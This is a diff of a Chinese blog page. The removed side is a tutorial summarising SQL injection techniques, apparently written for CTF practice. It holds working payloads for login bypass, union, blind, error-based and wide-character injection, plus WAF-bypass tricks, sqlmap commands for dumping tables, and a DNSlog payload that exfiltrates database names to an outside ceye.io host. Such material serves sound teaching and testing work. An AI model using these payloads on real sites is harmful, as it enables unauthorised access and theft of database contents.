@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>sql注入总结 | Wking&#39;s Blog</title>
+  <title>归档: 2021/11 | Wking&#39;s Blog</title>
 
   <link rel="icon" type="image/png" href="/favicon.png">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -565,598 +565,106 @@
     <!-- 内容区域 -->
     <div id="safearea">
       <main class="main" id="pjax-container" style="margin-top: 0;">
-        
- <!-- prismjs 代码高亮 -->
- 
-    
-    <link href="/js/prism/prism-line-numbers.css" rel="stylesheet">
-    
-        <link href="/js/prism/prism-tomorrow.min.css" rel="stylesheet">
-    
-
-    <style>
-        pre[class*="language-"] {
-            overflow-y: hidden;
-        }
-        .line-numbers .line-numbers-rows {
-            border: none;
-        }
-    </style>
-  
-
-
-<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
-
-<!-- 文章详情页顶部图片和标题 -->
-
-
-
-
-<div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
-  background-position: center center;position: relative;background-image:url('/medias/11.jpg')">
-  <div class="post-detail-header-mask"></div>
-  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
-  
-  <div class="post-detail-header_info-box">
-    <div class="title-box">
-      <span class="title">
-        sql注入总结
-      </span>
-    </div>
-    
-    
-      
-        <span class="post-detail-header_date">
-          <i class="fas fa-calendar"></i> 发表于：2021-10-27 |
-        </span>
-      
-
-      
-        <span class="post-detail-header_categories">
-          <i class="iconfont iconbookmark1"></i> 分类：
-          
-            <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="post-detail-header_category">
-              Web安全
-            </a>
-          
-        </span>
-      
-
-      
-        <div class="post-detail-header_wordcount">
-          <span class="totalcount">
-            <i class="fas fa-file-text-o"></i> 字数统计: 1.4k |
-          </span>
-  
-          <span class="min2read">
-            <i class="fas fa-clock"></i> 阅读时长: 6分钟 |
-          </span>
-  
-          
-            <span class="reading">
-              <i class="fas fa-eye"></i> 阅读量：<span id="busuanzi_value_page_pv"></span>
-            </span>
-          
-        </div>
-      
-    
+        <div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"></div>
+<div class="bg-light-floor-archive" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -3;"></div>
+<div class="archive-header" style="background-image:url('/medias/6.jpg')">
+  <div class="archive-header-title">
+    archive
   </div>
+  <div class="archive-header-desc">
   
-  
-    <script src="/js/bubble/bubble.js"></script>
-  
-</div>
-
-
-
-<div class="row justify-position">
-  <div class="main-content">
-    <article class="post post-detail">
-      <div class="post-content">
-        <h3 id="一、常见注入方式"><a href="#一、常见注入方式" class="headerlink" title="一、常见注入方式"></a>一、常见注入方式</h3><p>万能密码：</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1&#39; or &#39;1&#39;&#x3D;&#39;1　　　　　　　　#完整语句 select username,age from userinfo where id&#x3D;&#39;&#39; or &#39;1&#39;&#x3D;&#39;1&#39;
-1&#39; or 1&#x3D;1 #　　　　　　　　　#完整语句 select username,age from userinfo where id&#x3D;&#39;&#39; or 1&#x3D;1#&#39;
-1&#39;&#x3D;0 #　　　　　　　　　　　　#完整语句 select username,age from userinfo where id&#x3D;&#39;&#39;&#x3D;0#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p><code>1&#39; order by n</code> 判断字段数，当n回显正常，n+1报错，即n是字段数</p>
-<p><font color='red'>注意事项：</font></p>
-<ul>
-<li>在手工注入时，字符串为表名要加反引号</li>
-</ul>
-<h4 id="1-Union-联合查询"><a href="#1-Union-联合查询" class="headerlink" title="1.Union(联合查询)"></a>1.Union(联合查询)</h4><p>union联合查询，若前者查询失败则会显示后者查询的结果<br>进而利用select 1,2,3,…… 找到可以显示的字段号，例如2,3 即可在2,3位置替换成相应的函数<br>例如<code>database()</code>数据库名称,<code>version()</code>版本</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">查询有哪些表：
-group_concat(&#39;&lt;br&gt;&#39;,table_name) from information_schema.tables where table_schema&#x3D;database()
-查询表中字段：
-group_concat(&#39;&lt;br&gt;&#39;,column_name) from information_schema.columns where table_name&#x3D;&#39;&#39; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>通过<strong>information_schema</strong>数据库获取信息</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1.查找库名
-select schema_name from information_schema.schemata;
-2.查找表
-select table_name from information_schema.tables where table_schema&#x3D;&#39;AAA&#39;;
-3.查找表中字段
-select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;BBB&#39;;
-4.查找数据
-select username,passwd from BBB;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="2-布尔盲注"><a href="#2-布尔盲注" class="headerlink" title="2.布尔盲注"></a>2.布尔盲注</h4><blockquote>
-<p>web页面返回值是布尔型，注入后根据页面返回值来得到数据库信息的方法</p>
-</blockquote>
-<p>1.获取数据库名称的长度<br>    <code>(length(database()))&gt;8 </code>不断的进行判断<br>2.获取数据库名称<br>    <code>(ascii(substr(database(),1,1))=115)</code>第一位 或者 <code>(substr(database(),1,1)=&#39;s&#39;)</code><br>    <code>(ascii(substr(database(),2,1))=115)</code>第二位</p>
-<h4 id="3-时间盲注"><a href="#3-时间盲注" class="headerlink" title="3.时间盲注"></a>3.时间盲注</h4><blockquote>
-<p>根据web页面响应的时间差来判断该页面是否存在SQL注入点（union和布尔盲注用不了时）</p>
-</blockquote>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1.用sleep判断注入点
-	?id&#x3D;1&#39; and sleep(3) --+ 发现3s后网页才刷新，说明语句被带到数据库中执行了
-2.获取数据库名称长度
-	?id&#x3D;1&#39; and if((length(database())&gt;7),sleep(3),1) --+ 不断进行判断
-3.获取数据库名称
-	?id&#x3D;1&#39; and if((ascii(substr(database(),1,1))&gt;101),sleep(3),1) --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="4-报错注入-xpath注入"><a href="#4-报错注入-xpath注入" class="headerlink" title="4.报错注入(xpath注入)"></a>4.报错注入(xpath注入)</h4><blockquote>
-<p>人为地制造报错条件，使查询结果能够出现在错误信息中（要能返回错误信息）</p>
-</blockquote>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">#1.updatexml()
-	?id&#x3D;1&#39; and (updatexml(1,concat(0x7e,(select user())),1))#
-#2.extractvalue()
-	?id&#x3D;1&#39; and (extractvalue(1,concat(0x7e,(select user()),0x7e)))#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="5-DNSlog盲注"><a href="#5-DNSlog盲注" class="headerlink" title="5.DNSlog盲注"></a>5.DNSlog盲注</h4><blockquote>
-<p>利用其他协议或者渠道，http,dns解析等，将数据外带出来，直接回显数据实现注入，可以减少发送的请求</p>
-</blockquote>
-<p>利用条件：mysql.ini中 secure_file_priv 必须为空<br>        为null时，不允许导入导出<br>        为/tmp时，导入导出只能在/tmp目录下<br>payload:<br><code>?id=1&#39; and load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.xxx.ceye.io\\abc&#39;))--+</code><br>相应更换sql语句，xxx为ceyo.io平台给每个账号起的昵称<br>例如：<br><code>?id=1&#39; and load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.t98xmx.ceye.io\\abc&#39;))--+</code></p>
-<h4 id="6-堆叠注入"><a href="#6-堆叠注入" class="headerlink" title="6.堆叠注入"></a>6.堆叠注入</h4><p>通过<code>;</code> 执行多条sql语句</p>
-<h4 id="7-宽字符注入"><a href="#7-宽字符注入" class="headerlink" title="7.宽字符注入"></a>7.宽字符注入</h4><p>通常过滤 <code>&#39;</code> 的方法是在前面加上转义符：\</p>
-<p>‘的url编码为%27，\的url编码为%5c, 加上%df后</p>
-<p>而在GBK编码方式下，%df%5c是一个繁体字“連”，所以单引号成功逃逸。</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id &#x3D; -1%df&#39; union select ……<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
-<h3 id="二、绕过技巧"><a href="#二、绕过技巧" class="headerlink" title="二、绕过技巧"></a>二、绕过技巧</h3><p>参考博客之一：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Vinson404/p/7253255.html">SQL注入绕过技巧 - VVVinson - 博客园 (cnblogs.com)</a></p>
-<h5 id="1-关键词嵌套、大小写绕过"><a href="#1-关键词嵌套、大小写绕过" class="headerlink" title="1.关键词嵌套、大小写绕过"></a>1.关键词嵌套、大小写绕过</h5><ul>
-<li>union ==&gt; UNIunionO</li>
-</ul>
-<h5 id="2-各种编码"><a href="#2-各种编码" class="headerlink" title="2.各种编码"></a>2.各种编码</h5><ul>
-<li>URL编码 <strong>例如：# 对应的编码为 %23</strong></li>
-<li>16进制编码</li>
-<li>ASCII编码</li>
-<li>Unicode编码</li>
-<li>双重编码</li>
-<li>还有8进制，utf-32，utf-16 等等</li>
-</ul>
-<h5 id="3-关键字替换"><a href="#3-关键字替换" class="headerlink" title="3.关键字替换"></a>3.关键字替换</h5><ul>
-<li>空格替换：/**/, () ,Tab代替空格, 0xa0用16进制解码</li>
-<li>and替换：&amp;&amp;</li>
-<li>or替换：||</li>
-<li>=替换：!&lt;&gt;，like , rlike</li>
-<li>引号替换：用16进制编码</li>
-</ul>
-<h5 id="4-逗号绕过（使用from或者offset）："><a href="#4-逗号绕过（使用from或者offset）：" class="headerlink" title="4.逗号绕过（使用from或者offset）："></a>4.逗号绕过（<strong>使用from或者offset</strong>）：</h5><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。</p>
-<p>对于substr()和mid()这两个方法可以使用<code>from to</code>的方式来解决：</p>
-<pre class="line-numbers language-none"><code class="language-none">select substr(database() from 1 for 1);
-select mid(database() from 1 for 1);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>使用join：</p>
-<pre class="line-numbers language-none"><code class="language-none">union select 1,2     #等价于
-union select * from (select 1)a join (select 2)b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p> 使用like：</p>
-<pre class="line-numbers language-none"><code class="language-none">select ascii(mid(user(),1,1))&#x3D;80   #等价于
-select user() like &#39;r%&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>对于<code>limit</code>可以使用<code>offset</code>来绕过：</p>
-<pre class="line-numbers language-none"><code class="language-none">select * from news limit 0,1
-# 等价于下面这条SQL语句
-select * from news limit 1 offset 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<h5 id="等价函数绕过"><a href="#等价函数绕过" class="headerlink" title=".等价函数绕过"></a>.等价函数绕过</h5><ul>
-<li>hex()、bin()=ascii()</li>
-<li>concat_ws()=group_concat()</li>
-<li>mid()、substr()=substring()</li>
-<li>sleep() ==&gt;benchmark()</li>
-</ul>
-<h3 id="三、sqlmap使用"><a href="#三、sqlmap使用" class="headerlink" title="三、sqlmap使用"></a>三、sqlmap使用</h3><p>详细使用：<a target="_blank" rel="noopener" href="https://www.vuln.cn/2035">sqlmap用户手册详解【实用版】 | 漏洞人生 (vuln.cn)</a></p>
-<p>tamper脚本讲解：<a target="_blank" rel="noopener" href="https://www.vuln.cn/2086">sqlmap注入之tamper绕过WAF防火墙过滤 | 漏洞人生 (vuln.cn)</a></p>
-<p>-u “url”            检测目标网站是否存在注入<br>-u “url” –dbs            获取数据库所有库的名称<br>-u “url” –users        列数据库用户<br>-u “url” –is-dba        判断当前用户是否为数据库管理员权限<br>-u “url” –current-db        获取当前使用的数据库<br>-u “url” –current-user        获取当前用户名称<br>-u “url” -D “xxx” –tables    获取xxx库下的表<br>-u “url” -D “xxx” -T “A,B” –columns     获取A,B表中的字段<br>-u “url” -D “xxx” -T “A” -C “a,b,c” –dump     导出表A中字段a,b,c的数据</p>
-<p>-r xxx.txt            post传入数据进行注入<br>–level                探测等级参数<br>–tamper            使用绕过脚本<br>-u “url” -p “id,username”    指定参数进行扫描<br>设置具体sql注入技术：<br>    –technique B    布尔注入<br>    –technique E    报错注入<br>    –technique U    union查询注入<br>    –technique S    堆叠注入<br>    –technique Q    内联查询注入<br>    –technique T    时间盲注<br>    –technique T –time-sec 3 时间盲注时间为3</p>
-<p>cookie注入：-u “url” –cookie “id=1” –level 2 –dbs<br>UA注入    : -u “url” –level 3 –dbs<br>refer注入 ：-u “url” –level 5 –dbs</p>
-
-      </div>
-      <div class="post-tags-categories">
-        
-        <div class="tags">
-          
-            <a href="/tags/sql%E6%B3%A8%E5%85%A5/" class="">
-              sql注入
-            </a>
-          
-        </div>
-        
-      </div>
-      
-        <div class="copyright">
-  <ul class="post-copyright">
-    <li class="post-copyright-author">
-    <strong>作者:  </strong>Wking</a>
-    </li>
-    <li class="post-copyright-link">
-    <strong>文章链接:  </strong>
-    <a href="/2021/10/27/sql注入总结/" target="_blank" title="sql注入总结">https://Wkingxc.com/2021/10/27/sql注入总结/</a>
-    </li>
-    <li class="post-copyright-license">
-      <strong>版权声明:   </strong>
-      本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
-      许可协议。转载请注明出处!
-    </li>
-  </ul>
-<div>
-      
-    </article>
-    <!-- 上一篇文章和下一篇文章 -->
-    
-      <!-- 文章详情页的上一页和下一页 -->
-<div class="post-nav">
-
-
-
-  
-  <div class="post-nav-prev post-nav-item">
-    <div class="post-nav-img" style="background-size: cover; 
-      background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="/medias/2.jpg" class="lazyload placeholder" data-srcset="/medias/2.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="">
-    </div>
-    <a href="/2021/10/28/BUUCTF-EasyCalc/" class="post-nav-link">
-      <div class="title">
-        <i class="fas fa-angle-left"></i> 上一篇:
-        <div class="title-text">BUUCTF-EasyCalc</div>
-      </div>
-      
-      <!-- <div class="content">
-        知识点：PHP字符串解析特性
-
-查看题目和源代码：
-
-
-可以看到一个新页面和设置了WAF
-打开新页面，发现了eval()
-      </div> -->
-    </a>
-  </div>
-
-
-
-  
-  <div class="post-nav-next post-nav-item">
-    <div class="post-nav-img" style="background-size: cover; 
-      background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="/medias/15.jpg" class="lazyload placeholder" data-srcset="/medias/15.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" src="" alt="">
-    </div>
-    <a href="/2021/10/26/BUUCTF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/" class="post-nav-link">
-      <div class="title">
-        下一篇: <i class="fas fa-angle-right"></i>
-        <div class="title-text">BUUCTF-随便注</div>
-      </div>
-      <!-- <div class="content">
-        简单尝试后，发现是字符型注入，字段为2
-
-尝试使用union注入，发现被过滤，尝试后发现，无法绕过select的过滤
-
-
-      </div> -->
-    </a>
-  </div>
-
-</div>
-
-    
-    
-
-    <!-- 打赏 -->
-    
-
-    <!-- 分享 -->
-    
-      <!-- https://github.com/overtrue/share.js -->
-<!-- 文章详情页的分享 -->
-<div class="social-share" data-sites="qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
-
-<script src="/js/shareJs/social-share.min.js"></script>
-</script>
-
-<style>
-  .social-share {
-    margin: 20px 0;
-  }
-</style>
-
-
-    
-    
-    <!-- 评论 -->
-    <!-- 评论 -->
-
-  <div id="myComment">
-    
-      
-<section id="comments" style="padding: 1em; margin: 15px auto;"
-	class="animated bounceInUp">
-	<div id="vcomment" class="comment"></div>
-</section>
-<style>
-	#comments {
-		background: rgba(255,255,255,0.9);
-	}
-	#veditor {
-		background-image: url('https://img.zcool.cn/community/01a253594c71cfa8012193a329a77f.gif');
-		background-size: contain;
-		background-repeat: no-repeat;
-		background-position: right;
-		background-color: rgba(255, 255, 255, 0);
-		resize: vertical;
-	}
-	#veditor:focus{
-		background-position-y: 200px;
-		transition: all 0.2s ease-in-out 0s;
-	}
-	#vcomment .vcards .vcard .vh .vhead .vtag.vvisitor {
-		background-color: #42b983;
-	}
-	.v[data-class=v] .vbtn:active, .v[data-class=v] .vbtn:hover {
-		color: #42b983;
-		border-color: #42b983;
-	}
-	#vcomment .vcards .vcard .vhead .vsys i {
-		display: none;
-	}
-	/* 底部valine链接 */
-	#vcomment .vpower {
-		display: none;
-	}
-	
-	/* 底下注释是修改 名称和邮箱和网址输入框的样式 */
-	/* #vcomment .vheader {
-		display: flex;
-		justify-content: space-around;
-	}
-	
-	#vcomment .vheader .vnick {
-		width: 31%;
-		border: 2px solid #dedede;
-		padding-left: 10px;
-		padding-right: 10px;
-		border-radius: 5px
-	}
-
-	#vcomment .vheader .vmail {
-		width: 31%;
-		border: 2px solid #dedede;
-		padding-left: 10px;
-		padding-right: 10px;
-		border-radius: 5px
-	}
-
-	#vcomment .vheader .vlink {
-		width: 31%;
-		border: 2px solid #dedede;
-		padding-left: 10px;
-		padding-right: 10px;
-		border-radius: 5px
-	} */
-
-	img.vimg {
-		transition: all 1s;
-		/* 头像旋转时间为 1s */
-	}
-
-	img.vimg:hover {
-		transform: rotate(360deg);
-		-webkit-transform: rotate(360deg);
-		-moz-transform: rotate(360deg);
-		-o-transform: rotate(360deg);
-		-ms-transform: rotate(360deg);
-	}
-
-	#vcomment .vcards .vcard {
-		padding: 15px 20px 0 20px;
-		border-radius: 10px;
-		margin-bottom: 15px;
-		box-shadow: 0 0 4px 1px rgba(0, 0, 0, .12);
-		transition: all .3s
-	}
-
-	#vcomment .vcards .vcard:hover {
-		box-shadow: 0 0 8px 3px rgba(0, 0, 0, .12)
-	}
-
-	#vcomment .vcards .vcard .vh .vcard {
-		border: none;
-		box-shadow: none;
-	}
-</style>
-    
-  </div>
-
-<!-- comment script in themes\hexo-theme-bamboo\layout\_partial\scripts\index.ejs -->
-
-
-  </div>
-
-  <!-- 目录 -->
-  <!-- 文章详情页右侧目录 -->
-
-  <div class="toc-aside">
-    <div class="toc-main">
-      <div class="toc-aside-title">
-        <i class="fas fa-list-ul" aria-hidden="true"></i><span>本文目录</span>
-        
-          <div class="toc-open-close">本文目录</div>
-        
-      </div>
-      <div class="toc-content">
-        <div class="toc"></div>
-      </div>
-    </div>
-  </div>
-
-  <!-- 手机端目录按钮 -->
-  <div id="toc-mobile-btn">
-    <i class="fas fa-list-ul" aria-hidden="true"></i>
-  </div>
-  <!-- js在scripts目录下的的toc.ejs里面 -->
-  
-
+  <span class="title" id="archive-header-desc"></span>
   <script>
-    function openBtnClickFn () {
-      let openOrCloseBtn = $('.toc-aside .toc-aside-title .toc-open-close');
-      let open = eval('' || 'true');
-      openOrCloseBtn.click(function() {
-        if (open === true) {
-          $(".toc-aside").css({'width': 0, 'padding': 0});
-          $(".toc-content").css({'width': 0});
-          $(".toc-aside-title span, .toc-aside-title i").css({'display': 'none'});
-          $(".main-content").css({'width': '75%', 'margin': '10px auto'});
-          open = false;
-        } else {
-          $(".toc-aside").css({'width': '300px', 'padding': '0 10px'});
-          $(".toc-content").css({'width': '300px'});
-          $(".toc-aside-title span, .toc-aside-title i").css({'display': 'inline-block'});
-          $(".main-content").css({'width': '65%', 'margin-right': '10px', 'margin-left': 'calc(35% - 350px)'});
-          open = true;
-        }
-      });
-    };
-    openBtnClickFn();
-    document.addEventListener('pjax:complete', function () {
-      openBtnClickFn();
-    })
-    
-  </script>
-
-
-  <!-- 图片放大 Wrap images with fancybox support -->
-  <script src="/js/wrapImage.js"></script>
-</div>
-
-<!-- 文章详情页背景图 -->
-<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"
-	:style="{'background-color': bgColor ? bgColor : 'transparent'}">
-	<transition-group tag="ul" :name="names">
-		<li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
-			<img :src="image" class="bg-swiper-img no-lazy">
-		</li>
-	</transition-group>
-</div>
-<script>
-	var vm = new Vue({
-		el: '#appBgSwiper',
-		data: {
-			names: '' || 'fade' || 'fade', // translate-fade fade
-			mark: 0,
-			img: [],
-			bgColor: '',
-			time: null
-		},
-		methods: {   //添加方法
-			change(i, m) {
-				if (i > m) {
-					// this.names = 'fade';
-				} else if (i < m) {
-					// this.names = 'fade';
-				} else {
-					return;
-				}
-				this.mark = i;
-			},
-			prev() {
-				// this.names = 'fade';
-				this.mark--;
-				if (this.mark === -1) {
-					this.mark = 3;
-					return
-				}
-			},
-			next() {
-				// this.names = 'fade';
-				this.mark++;
-				if (this.mark === this.img.length) {
-					this.mark = 0;
-					return
-				}
-			},
-			autoPlay() {
-				// this.names = 'fade';
-				this.mark++;
-				if (this.mark === this.img.length) {
-					this.mark = 0;
-					return
-				}
-			},
-			play() {
-				let bgImgDelay = '' || '180000'
-				let delay = parseInt(bgImgDelay) || 180000;
-				this.time = setInterval(this.autoPlay, delay);
-			},
-			enter() {
-				clearInterval(this.time);
-			},
-			leave() {
-				this.play();
-			}
-		},
-		created() {
-			this.play()
-		},
-		beforeDestroy() {
-			clearInterval(this.time);
-		},
-		mounted() {
-			let prop = '' || '/medias/back.jpg';
-			let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://')
-			if (isImg) {
-				let img = prop.split(',');
-				let configRoot = '/'
-				let arrImg = [];
-				img.forEach(el => {
-					var Expression = /http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
-					var objExp = new RegExp(Expression);
-
-					if (objExp.test(el)) {
-						// http or https
-						arrImg.push(el);
-					} else {
-						// 非http or https开头
-						// 本地文件
-						let firstStr = el.charAt(0);
-						if (firstStr == '/') {
-							el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
-						}
-						el = configRoot + el;
-						arrImg.push(el);
-					}
-				})
-				this.img = arrImg;
-			} else {
-				this.bgColor = prop;
-			}
-		}
-	})
+  function typedFn() {
+    const el = '#archive-header-desc';
+    const type = 'archive';
+    let desc = '愿你如风，被人温柔以待'
+    var typed = new Typed(el, {
+      strings: [desc],
+      startDelay: 100,
+      typeSpeed: 60,
+      loop: true,
+      backSpeed: 50,
+      showCursor: true
+    });
+  }
+  typedFn();
 </script>
+  
+  </div>
+  <div class="mask-box"></div>
+</div>
 
-<style>
-	.bg-swiper-box {
-		position: absolute;
-		display: block;
-		width: 100%;
-		height: 100%;
-	}
+<div class="archive-video">
+  <video class="full-video" autoplay loop muted>
+      <source style="width: 100%;height: 100vh;" src="/">
+  </video>
+  <div class="video-header-title">
+    archive
+  </div>
+  <div class="video-header-desc">
+  
+      <span class="title" id="archive-video-header-desc"></span>
+      <script>
+  function typedFn() {
+    const el = '#archive-video-header-desc';
+    const type = 'archive';
+    let desc = '愿你如风，被人温柔以待'
+    var typed = new Typed(el, {
+      strings: [desc],
+      startDelay: 100,
+      typeSpeed: 60,
+      loop: true,
+      backSpeed: 50,
+      showCursor: true
+    });
+  }
+  typedFn();
+</script>
+      
+  </div>
+  <div class="mask-box"></div>
+</div>
 
-	.bg-swiper-img {
-		object-fit: cover;
-		width: 100%;
-		height: 100%;
-	}
-</style>
+<!-- hash算法 -->
+
+
+<div class="archive-main">
+  <section class="archive">
+    <div class="archive-content">
+      <ul class="post-archive">
+        
+        
+          
+            
+            <div class="year" data-aos="zoom-in-up">
+                <div class="bullet"></div>
+                <a href="/archives/2021">2021</a>
+            </div>
+          
+          <li class="post-item" data-aos="fade-left">
+            
+            <div class="post-img-box">
+              <a href="/2021/11/01/BUUCTF-HardSQL/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" src="/medias/10.jpg" class="lazyload placeholder" data-srcset="/medias/10.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                <span class="post-date">11-01</span>
+              </div>
+              <a class="post-title" href="/2021/11/01/BUUCTF-HardSQL/">BUUCTF-HardSQL</a>
+            </div>
+          </li>
+        
+      </ul>
+    </div>
+  </section>
+  <div class="archive-paginator">
+    
+  </div>
+</div>
 
       </main>
     </div>
